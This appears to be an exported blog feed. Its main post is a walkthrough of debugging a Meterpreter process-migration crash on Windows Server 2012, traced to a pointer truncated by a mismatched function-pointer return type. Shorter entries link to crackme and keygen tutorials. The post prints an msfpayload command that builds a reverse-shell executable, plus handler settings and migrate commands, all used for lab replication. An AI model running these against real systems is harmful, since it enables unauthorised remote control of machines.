    <content type="html"><![CDATA[<p>If you haven&rsquo;t ever heard of <a href="https://github.com/rapid7/meterpreter" title="Native Meterpreter">Meterpreter</a> before, you might want to go and take a look at it before reading this post to help give some context. In short, Meterpreter is an amazing library that is part of the <a href="http://www.metasploit.com/" title="Metasploit Framework">Metasploit Framework</a> and can be used to give you tremendous power and control over target machines during a <a href="http://en.wikipedia.org/wiki/Penetration_test" title="Penetration Testing">penetration test</a>. Anyone and everyone in the security game is most likely familiar with both Metasploit and Meterpreter, at the very least, if not closely intimate with them. The toolset is fantastic, and is <a href="https://github.com/rapid7/metasploit-framework/" title="Metasploit Framework Source">open source</a>!</p>

<p>I&rsquo;m currently in the very fortunate position of <a href="https://community.rapid7.com/community/metasploit/blog/2013/09/05/weekly-update" title="Weekly Update: Meterpreter Updates, VMWare, the OSX spycam, Retabbing, and more!">working with the crew</a> from <a href="http://www.rapid7.com/" title="Rapid 7">Rapid7</a> to help improve Meterpreter, particularly on the Windows (both 32 and 64 bit). I have a good list of things to work through while I&rsquo;m on board including making it easier to build for potential contributors, and to fix some outstanding issues that the R7 crew haven&rsquo;t had the bandwidth to fix.  These people are super-smart, and super-nice and I&rsquo;m honoured that I&rsquo;ve been selected to work alongside them.</p>

<p>The purpose of this post is to document the process and resolution of a bug that I have helped resolve since joining. I also aim to lift the lid on Meterpreter a little and help expose how some bits of it work. I hope you enjoy.</p>

<h2>Meterpreter Basics</h2>

<p>When exploiting a vulnerability during a penetration test using Metasploit, you have a number of payloads that you choose to use which give you some sort of control over your target. Of those payloads, Metepreter is not only the most common, but is probably the most powerful.</p>

<p>Once you have an instance of Metepreter running on a target, you&rsquo;ve got quite a lot of control. You can escalate privileges, dump password hashes, launch processes, upload files, and you can even use it as a pivot-point for launching attacks against other non-routable hosts. While the power of all this is enough to bake anyone&rsquo;s noodle, the thing that blows my mind the most is Meterpreter&rsquo;s ability to migrate to other processes. That is, Meterpreter can dynamically load itself into another processes and then reconnect to your Metasploit session seamlessly without any effort from the attacker (ie. you). Simply executing <code>migrate &lt;process id&gt;</code> at the Meterpreter prompt is all it takes.</p>

<p>There are some caveats when it comes to migration. In particular, you need to have permission to write to the target process&rsquo;s memory otherwise the migration will not succeed.</p>

<p>Meterpreter comes in quite a few flavours, including <code>PHP</code>, <code>Python</code>, and <code>native/C</code> for Linux and Windows. Some implementations are more feature-rich than others, but they all have common functionality which makes it easy to perform a variety of functions on a compromised host.</p>

<p>We&rsquo;ll be focusing on the Windows native payload in this post, and in particular we&rsquo;ll be looking at how Meterpreter is loaded and executed.</p>

<h2>Reflective DLL Injection</h2>

<p>Simply put, Reflective DLL Injection is a method for injection a DLL into a process. No surprises there. However, it has some nifty properties that make a great candidate for use in tools such as Meterpreter. Some of those points include:</p>

<ul>
<li>Position-independence.</li>
<li>Lack of host system registration.</li>
<li>Largely undetectable on the target at both a system and process level.</li>
</ul>


<p>The canonical paper [<a href="http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf" title="Reflective DLL Injection">PDF</a>], written by <a href="http://twitter.com/stephenfewer">Stephen Fewer</a>, is well worth reading and can be found on the <a href="http://harmonysecurity.com/" title="Harmony Security">Harmony Security</a> website. Read it. It&rsquo;s amazing, and does a much better job of explaining itself than I could ever hope to. I would like to point out that there&rsquo;s a multi-stage process involved which includes:</p>

<ul>
<li>Writing the code to an executable area of memory.</li>
<li>Executing the loader which creates a valid DLL image in memory.</li>
<li>Calling <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583(v=vs.85).aspx" title="DllMain Entry Point">DllMain</a> on the loaded DLL.</li>
<li>Returning control to the process that invoked it.</li>
</ul>


<p>With that in mind, let&rsquo;s take a look at the bug.</p>

<h2>The Bug</h2>

<p>The bug that was reported related to process migration, and went something like this (paraphrased slightly with a bit more information):</p>

<blockquote><p>Trying to migrate Metepreter between processes on Windows 2012 seems to be
unreliable. It will migrate just fine into some processes, such as <em>explorer.exe</em>,
without any problems. However, spawning another process, such as <em>notepad.exe</em>, and
migrating to it hangs the entire session. Migrating to the <em>winlogon.exe</em> process
crashes the entire user environment on the target host.</p></blockquote>

<p>When I first read this report I thought &ldquo;Wow, how am I going to track this down?&rdquo;, and I&rsquo;ll admit that I was a little intimidated at first, especially given that I knew that the native Windows Meterpreter was using Reflective DLL Injection to load itself into other processes. However, it&rsquo;s been a long time since I&rsquo;d been tasked with something this challenging and so, deep down, I was looking forward to diving in.</p>

<h2>Replication</h2>

<p>The first step was to fire up a Windows 2012 virtual machine and replicate the problem. Windows 2012 only comes in a 64-bit flavour, so picking the right version wasn&rsquo;t a problem.</p>

<p>After installation, I needed to simulate an attack coming from Metasploit so that I could interact with Meterpreter to perform the migration.</p>

<p>Creating a payload to do this is really simple thanks to <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload" title="msfpayload">msfpayload</a> (part of Metasploit). On my <a href="http://www.backtrack-linux.org/" title="Backtrack Linux">Backtrack</a> VM I used the following command to generate the PE image:</p>

<pre><code>root@bt:~# msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.5.26.40 LPORT=443 X &gt; 40-443-x64.exe
</code></pre>

<p>This command creates a 64-bit Windows executable that contains a small stager. This stager connects to <code>10.5.26.40</code> (my Backtrack VM) on port <code>443</code> (I always choose the HTTPS port to avoid potential outbound firewall issues). Once connected it will download the Meterpreter payload and establish a session with Metasploit.</p>

<p>I copied this binary to the Windows 2012 machine ready to execute. At this point, Metasploit needs to be set up and configured to deal with the incoming request. On the Backtrack VM, we run <code>msfconsole</code> and set it up to use <code>multi/handler</code> with the appropriate settings, like so:</p>

<pre><code>msf exploit(handler) &gt; show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LHOST     10.5.26.40       yes       The listen address
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
</code></pre>

<p>With those settings in place, the exploit was ready to fire:</p>

<pre><code>msf exploit(handler) &gt; exploit

[*] Started reverse handler on 10.5.26.40:443 
[*] Starting the payload handler...
</code></pre>

<p>From the Windows 2012 VM I ran the exploit binary and my Metepreter session kicked off:</p>

<p>Migration seemed to work. Next I tried the failure case. First I launched <code>notepad.exe</code> and then attempted to migrate to it:</p>

<pre><code>meterpreter &gt; execute -f notepad.exe -t -H
Process 192 created.

</code></pre>

<p>The session hung at this point and no Meterpreter commands would work. When I went over to the Windows 2012 VM I saw that there was a notification that the notepad.exe process had crashed. This was great as I was able to reproduce the failure. It was time to investigate the problem.</p>

<h2>Diagnosis</h2>

<p>To help figure out what was going wrong, I enlisted the help of two of my favourite tools: <a href="http://technet.microsoft.com/en-au/sysinternals/bb896647.aspx" title="DebugView">DebugView</a> and <a href="http://en.wikipedia.org/wiki/WinDbg" title="Windbg">Windbg</a>. Coverage of these tools is beyond the scope of the article, so if you want to learn more about them you&rsquo;ll find a stack of information out on the web. Given that this machine was 64-bit and the process we were aiming to debug was 64-bit, I installed the 64-bit version of the <a href="http://msdn.microsoft.com/en-us/windows/hardware/gg463009.aspx" title="Debugging Tools for Windows">Debugging Tools for Windows</a> so that the right version of <code>windbg</code> was available.</p>

<p>Before dabbling with any of the binaries and adding debug detail, I repeated the failure scenario but with one small change: I launched <code>notepad.exe</code> manually and attached to it from <code>windbg</code> prior to performing the migration. I left <code>DebugView</code> running as well to catch any debug messages from processes outside of the one that <code>windbg</code> was attached to.</p>

<p>Upon running the <code>migrate</code> command <code>notepad.exe</code> crashed and <code>windbg</code> caught the exception. This is what it showed:</p>

<pre><code>(ab0.448): Access violation - code c0000005 (first chance)

</code></pre>

<p>The migration process results in an attempt to execute a section of code in an area of memory that isn&rsquo;t marked as executable. Let&rsquo;s confirm that:</p>

<pre><code>0:003&gt; !vprot 00000000707a7b5c
BaseAddress:       00000000707a7000

State:             00010000  MEM_FREE
Protect:           00000001  PAGE_NOACCESS
</code></pre>

<p>As we can see the memory area is definitely not marked as executable. But should it be? Should this memory be executable, or are we just pointing to an invalid area of memory? If it was the former, then it might imply that DEP or ASLR are somehow interfering. However, my gut feeling was that it was the latter. A quick look at the contents of the memory at this location would be enough to confirm:</p>

<pre><code>0:003&gt; du 00000000707a7b5c
00000000`707a7b5c  "????????????????????????????????"
00000000`707a7b9c  "????????????????????????????????"
00000000`707a7bdc  "????????????????????????????????"
00000000`707a7c1c  "????????????????????????????????"
00000000`707a7c5c  "????????????????????????????????"
00000000`707a7c9c  "????????????????????????????????"
00000000`707a7cdc  "????????????????????????????????"
00000000`707a7d1c  "????????????????????????????????"
00000000`707a7d5c  "????????????????????????????????"
00000000`707a7d9c  "????????????????????????????????"
00000000`707a7ddc  "????????????????????????????????"
00000000`707a7e1c  "????????????????????????????????"
</code></pre>

<p>It&rsquo;s pretty clear that no valid code is located in this area of memory. This implied that there was a possibility that a pointer to an area of code is somehow going awry. But where? To find this out, I needed to add some more debug output to Meterpreter.</p>

<p>Next, I opened the Meterpreter source in Visual Studio 2012 (freshly moved from VS 2010 by yours truly) and prepared to rebuild the binaries with some extra debug output. I littered the code with <a href="http://msdn.microsoft.com/en-us/library/windows/apps/aa363362(v=vs.85).aspx" title="OutputDebugString function">OutputDebugString</a> calls at various key locations, enabled the existing logging that was built into the source, and rebuilt the suite of binaries from scratch. Once built, I deployed them to my Backtrack VM, fired up <code>DebugView</code> on the Windows 2012 VM and repeated the process (including attaching to <code>notepad.exe</code> with <code>windbg</code>). Here&rsquo;s a snippet of the output:</p>

</code></pre>

<p>The extra debug calls that I added to the source are those marked with <code>[LOADLIBRARYR]</code>. These calls were located in the guts of the reflective DLL injection code.</p>

<p>As we already know from earlier in this post, the reflective DLL injection code dynamically builds a valid DLL image in memory and then invokes it. The method which builds this DLL image is called <code>ReflectiveLoader()</code> and is invoked in code via a pointer called <code>pReflectiveLoader</code>, which you can see in the above output. At the end of the <code>ReflectiveLoader()</code> function, a reference to <code>DllMain()</code> is resolved and invoked directly prior to returning control to the caller.</p>

<p>Once this function returns, the Meterpreter-specific code then calls <code>DllMain()</code> again, using the value returned from <code>ReflectiveLoader()</code>, to invoke some functionality required by the Metasploit framework. In the above output, you can see the pointer to <code>DllMain()</code> called <code>pDllMain</code>, and this is the pointer that&rsquo;s used to make the call.</p>

<p>What was interesting about the log is that the first call to <code>DllMain()</code> that is invoked in the body of <code>ReflectiveLoader()</code> worked fine, otherwise the process would have crashed prior to the line that outputs the value of the <code>pDllMain</code> variable. Instead, it was the <em>second</em> call to <code>DllMain()</code> via the <code>pDllMain</code> pointer that caused the crash. This implied that the memory address that was being returned from <code>ReflectiveLoader()</code> was incorrect.</p>

<p>The nature of the reflective loading mechanism implied to me that the addresses of <code>pReflectiveLoader</code> and <code>pDllMain</code> should actually be quite close together in memory. However, focussing on a small part of the output, I noticed the following:</p>

<pre><code>[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
[LOADLIBRARYR] Calling pDllMain          (0000000033449BEC)
</code></pre>

<p>Those two pointers were nowhere near each other! The more perceptive of you will have noticed that the <code>pDllMain</code> pointer appeared to have lost its higher-order <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a>. The pointer had in fact been truncated!</p>

<p>But why? It wasn&rsquo;t immediately obvious to me what the reason was, but I was keen to validate that this was the case. To prove my theory, I hacked the code a little so that the higher-order DWORD of the <code>pReflectiveLoader</code> value was used as the higher-order DWORD of <code>pDllMain</code> as well. The hack looked something like this:</p>

<p>{% codeblock lang:c %}
ULONG_PTR ulReflectiveLoaderBase = ((ULONG_PTR)pReflectiveLoader) &amp; (((ULONG_PTR)-1) ^ (0xFFFFFFFF));
pDllMain = (DLLMAIN)(pReflectiveLoader() | ulReflectiveLoaderBase);
{% endcodeblock %}</p>

<p>After the above code, <code>pDllMain</code> would have the same higher-order DWORD value as <code>pReflectiveLoader</code>. I compiled, deployed, executed &hellip;</p>

<p>&hellip; and it worked!</p>

<h2>Resolution</h2>

<p>Armed with the knowledge earned from the above diagnosis, I set about looking through the code to see why this pointer was being truncated. Clearly the value was perfectly fine prior to being returned from <code>ReflectiveLoader()</code>, so why was it truncated upon return?</p>

<p>I spent quite a bit of time looking around, and I didn&rsquo;t find anything. Nothing was leaping out at me. I felt really stupid. So instead of beating about the bush, I contacted the man himself, the author and creator of Reflective DLL Injection himself, Mr <a href="http://twitter.com/stephenfewer">Stephen Fewer</a>. I explained the situation to him, detailed my findings and asked if he any idea as to why this problem might be occurring.</p>

<p>It didn&rsquo;t take long to get a response. Stephen jumped on the issue straight away, fixed it and submitted a <a href="https://github.com/rapid7/meterpreter/pull/14">pull request</a> to the Meterpreter repository before emailing me back with details of the solution. Talk about great service!</p>

<p>When I saw the solution I immediately felt stupid for missing it myself. In hindsight I should have known to look in this location. I ate some humble pie and savoured the taste while expressing my gratitude to Stephen for his prompt response.</p>

<p>So what was it?</p>

<p>The <code>pReflectiveLoader</code> pointer is a function pointer of a type defined like so:</p>

<p>{% codeblock lang:c %}
typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
{% endcodeblock %}</p>

<p>However, the <code>ReflectiveLoader()</code> function was defined in the source like so:</p>

<p>{% codeblock lang:c %}</p>

<h1>ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )</p>

<h1>else</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )</p>

<h1>endif</h1>

<p>{</p>

<pre><code>// ... snip ...
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>So the function returns a <a href="http://msdn.microsoft.com/en-us/library/cc230394.aspx" title="ULONG_PTR">ULONG_PTR</a> (which is 64-bits) but the function pointer type returned a <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a> (which is 32-bits). This is what was causing the truncation of the pointer and effectively zeroing out the higher-order DWORD of <code>pDllMain</code>. The fix was to simply change the return type of the function pointer to match:</p>

<p>{% codeblock lang:c %}
typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)( VOID );
{% endcodeblock %}</p>

<p>Problem solved.</p>

<h2>Extra Thoughts and Conclusion</h2>

<p>For those of you who are wondering, like I was, why this was an intermittent problem the answer lies in the fact that the new versions of Windows have newer versions of <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization" title="Adress Space Layout Randomisation">ASLR</a>. To quote Stephen:</p>

<blockquote><p>The bug was triggering on Server 2012 but not other 64bit systems
probably due to high entropy ASLR making allocations over the 4gig boundary.</p></blockquote>

<p>Earlier versions of Windows didn&rsquo;t have an ASLR implementation that resulted in memory allocations over the 4GB boundary. As a result, the higher-order DWORD was always zero anyway, which meant that the truncation had no impact.</p>

<p>This was a really fun bug to analyse and track down. I&rsquo;m glad we got to the bottom of it. Again I&rsquo;d like to thank Stephen for his involvement in locating the source of the problem.</p>

<p>The new and improved version of Meterpreter that contains this fix will be landing in Metasploit very soon (I hope). Thanks for reading. Comments and feedback are welcomed.  <a name="Edit15thSep"></a></p>

<h2>Edit 15th September</h2>

<p>Today on Twitter <a href="https://twitter.com/KronicDeth" title="Luke Imhoff @ Twitter">Luke Imhoff</a> asked me a good question:</p>

<blockquote class="twitter-tweet"><p><a href="https://twitter.com/TheColonial">@TheColonial</a> why didn&#39;t the compiler issue a truncation warning?</p>&mdash; Luke Imhoff (@KronicDeth) <a href="https://twitter.com/KronicDeth/statuses/378878334249095168">September 14, 2013</a></blockquote>


<script async src="http://buffered.io//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>I answered quickly but realised after that I was a bit hasty, so I&rsquo;m going to clarify on here instead.</p>

<p>We need to review a few snippets of code to understand why the compiler didn&rsquo;t complain. Firstly, the function-pointer type definition (prior to the fix):</p>

<p>{% codeblock ReflectiveDllInjection.h (partial) lang:c %}
typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
{% endcodeblock %}</p>

<p>Second, the declaration of the <code>ReflectiveLoader()</code> function:</p>

<p>{% codeblock ReflectiveLoader.c (partial) lang:c %}</p>

<h1>ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )</p>

<h1>else</h1>

<p>DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )</p>

<h1>endif</h1>

<p>{
   // &hellip; snip &hellip;
}
{% endcodeblock %}</p>

<p>Third, the declaration of both <code>pDllMain</code> and <code>pReflectiveLoader</code>:</p>

<p>{% codeblock LoadLibraryR.c (partial) lang:c %}
REFLECTIVELOADER pReflectiveLoader = NULL;
DLLMAIN pDllMain                   = NULL;
{% endcodeblock %}</p>

<p>Finally, the actual calls that use these pointers:</p>

<p>{% codeblock LoadLibraryR.c (partial) lang:c %}
pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);
// &hellip; snip &hellip;
pDllMain = (DLLMAIN)pReflectiveLoader();
{% endcodeblock %}</p>

<p>As we can see, <code>pReflectiveLoader</code> is set via a cast from a <code>UINT_PTR</code> type, which maps to the right sized pointer for whatever platform it&rsquo;s compiled on. Casting a <code>UINT_PTR</code> to a <code>REFLECTIVELOADER</code> type doesn&rsquo;t change the size.</p>

<p>At first I though the reason there was no compiler warning was because the result of calling <code>pReflectiveLoader</code> was cast to a <code>DLLMAIN</code> type, effectively hiding the problem, but that&rsquo;s not correct. If <code>pDllMain</code> was just a <code>ULONG_PTR</code> instead of <code>DLLMAIN</code> and no casting was used it still wouldn&rsquo;t have resulted in a problem because the return type of <code>REFLECTIVELOADER</code> is <em>smaller</em>, and hence an implicit cast would have turned this into a 64-bit value without complaining. The truncation has already happened because of the incorrect return type of <code>REFLECTIVELOADER</code>.</p>

<p>Ultimately the problem is down to the disconnect between the function pointer type and the function implementation type.</p>

<p>Thanks for the great question Luke.</p>

    <content type="html"><![CDATA[<p>This tutorial has been on the boil for quite a while.  I got close to nailing the problem late last month, but didn&rsquo;t end up finding the time to finish it until this weekend.  This tutorial is a solution to another Crackme, but this time it&rsquo;s really not for the faint-hearted.  Information on reversing fullscreen <a href="http://www.microsoft.com/directx/" title="DirectX">DirectX (Direct3D)</a> applications and playing around with <a href="http://www.schneier.com/blowfish.html" title="Blowfish">Blowfish</a> can be found in this tutorial, and it&rsquo;s a bit of a mind-job &ndash; it also weighs in at nearly 40 pages (with some nice pictures thrown in)!</p>

<p>Take a look at the <a href="/uploads/2007/04/silverdxcrackme1.zip">Crackme</a> and then <a href="/uploads/2007/04/Silver-DirectX-Solution-TheColonial.zip">my solution</a>. Enjoy.</p>

<h3>Update: 9th Feb 2012</h3>

<p>This tutorial was originally posted and hosted on <a href="http://www.crackmes.de/">Crackmes.de</a> alongside the crackme itself. Unfortunately Crackems.de had been taken offline for quite a while for legal reasons and hence the tutorial wasn&rsquo;t available there.</p>

<p>Thanks to issues with webhosts and backup failures, this tutorial was completely unavailable for a long time. Thankfully that site is back up now and I finally have a copy of the tutorial again.</p>

<p>You can still reference the material over on that <a href="http://www.crackmes.de/users/silver/silvers_dx_crackme_1/">site</a>, but I have decided to host a copy of it here as well.</p>

Today&rsquo;s installment is another tutorial that I felt shouldn&rsquo;t be published.  The reason is because it&rsquo;s a tutorial on how to solve an example reversing challenge for the <a href="http://certification.iitac.org/goto.php?target=cat_384&client_id=iitac" title="" target="_blank">IITAC online RCE adacemy</a>, and I generally don&rsquo;t think it&rsquo;s a good move to show other people how to do this stuff when they can get certified for it. However, this is just a <em>training</em> example so I think I&rsquo;m safe.</p>

<p>The challenge consists of a few tasks:<ol><li>Removing a nag-screen</li><li>Finding a hard-coded serial number</li><li>Finding a valid name/serial combination</li><li>Writing a key generator</li></ol>You&rsquo;ll notice from the tutorial that the full source code is included written in 32-bit ASM.  Again, I would appreciate the feedback on the quality from anyone who wishes to give it (that includes you Alister ;) ) as I&rsquo;m always looking to improve what I write.</p>

    <id>http://buffered.io/posts/a-reversing-tutorial</id>
    <content type="html"><![CDATA[<p>For a long time I&rsquo;ve been interested in the lovely and exciting art of <a href="http://en.wikipedia.org/wiki/Reverse_engineering" title="Reverse Engineering" target="_blank">Reverse Code Engineering</a> (RCE) and on more than one occasion I&rsquo;ve been sucked in to spending hours and hours delving through pages of ASM code searching for the answer.</p>

<p>Today is no different. With Amy feeling pretty crook due to a nasty headache, I thought I&rsquo;d retire to my PC and do something quiet that I haven&rsquo;t done for ages. So I downloaded a <a href="http://en.wikipedia.org/wiki/Crackme" title="Crackme" target="_blank">crackme</a> from <a href="http://www.crackmes.de/" title="Crackmes.de" target="_blank">Crackmes.de</a> and started reversing. After nailing the problem to the wall, I decided to unleash my learnings on the world via a tutorial. When coders go through the rigmarole of producing these little apps for people like me to play with, it seems only fair that I give back with a bit of information on how I broke their protection scheme. Not just that, but it gives other wannabe-reversers something to read and learn from to.</p>

<p>For those of you who are interested in reading and learning the basics, feel free to <a href="http://buffered.io/uploads/2007/03/nts-crackme10-solution-thecolonial.zip" title="Solution to a Crackme">download the goods</a>. Any feedback is appreciated (but only if it&rsquo;s good :D ).</p>
